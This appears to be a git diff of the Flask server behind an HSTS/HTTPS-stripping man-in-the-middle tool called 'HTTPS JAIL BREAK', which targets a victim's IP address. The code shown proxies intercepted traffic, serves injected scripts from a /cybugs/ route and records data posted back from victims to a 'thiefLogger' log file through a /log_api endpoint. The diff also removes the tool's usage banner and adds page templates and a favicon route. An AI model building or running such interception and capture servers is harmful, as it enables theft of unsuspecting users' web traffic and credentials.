@@ -4,42 +4,42 @@
 
 
 
-from flask import Flask, request,make_response
+from flask import Flask, request,make_response,render_template,send_from_directory
 import requests
 import proxy_utils 
 import logging
+import re
 import os 
 import proxy_parser 
-app = Flask(__name__)
+app = Flask(__name__,static_url_path='', 
+            static_folder='static',
+            template_folder='templates')
 PORT = 80
 HOST="0.0.0.0"
 logger = logging.Logger("thiefLogger")
-logger.addHandler(logging.FileHandler("thief.log"))
+logger.addHandler(logging.FileHandler("thiefLogger.log"))
 logger.setLevel(logging.WARN)
+VALID_IP = r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
+logedUsers = {} 
+
 @app.route("/",methods = ["GET"])
 def wellcome(): 
      if request.host.removeprefix("http://").startswith("vvvvvv"): 
         return proxy("/")
-     return f"""
-          <body  style="background-color:blue;">
-               <h1   style="color:lightgreen;font-size:75px;text-align: center;" >
-                    ⛓️⛓️⛓️ HTTPS JAIL BREAK ⛓️⛓️⛓️
-                    </br>
-                    </br>
-                    <span style="color:red;">
-                        usage:</br> <span style="font-size:40px;">python3 hstsjailbreak.py <target> [-h,--help] [-s,--silent] [-i=,--iface=] </span></br>
-                    ⛓️  🦊 HSTS JAIL BREAK 🦊 ⛓️</br>
-        mandatory arguments: </br>
-            🧔🏽‍♂️ target - the victim's ip address</br>
-	optional arguments:      </br>
-	    💁 -h,--help show this help message and exit </br>
-	    🤫 -s,--silent silent or loud mode </br>
-	    📬 -i,--iface IFACE Interface you wish to use </br>
-                    </span>  
-               </h1>
-          </body>
-          """
-          
+     return render_template('home_page.html' ) 
+       
+@app.route("/plots",methods = ["GET"])
+def plotsPage():
+     return render_template('perolad-analyze.html',)
+   
+@app.route("/favicon.ico",methods = ["GET"] )   
+def favicon():
+     req = request.host.removeprefix("http://").removeprefix("www.") 
+     if re.match(VALID_IP,req): 
+          return send_from_directory(os.path.join(app.root_path, 'static'),
+                          'favicon.ico',mimetype='image/vnd.microsoft.icon')
+     return proxy("favicon.ico")
+ 
 @app.route("/cybugs/<path:path>" , methods = ['GET'])
 def cybugsServe(path):
      script = "Error" 
@@ -60,12 +60,8 @@ def cybugsServe(path):
     
 @app.route("/log_api/<path:path>" , methods = ['POST'])  
 def log(path):  
-     print(path)
-     print("cool: ",request.json)
-     print("cool2 : ",request.data)
-     print("cool3 :",request.values)
-     print(request.form.get("logData"))
-     return "",200
+     logger.log(level = logging.WARNING ,msg= request.data)
+     return "<p>logged</p>",200
                          
 @app.route("/",methods = ["POST"])
 @app.route("/<path:path>", methods=['GET', 'POST'])
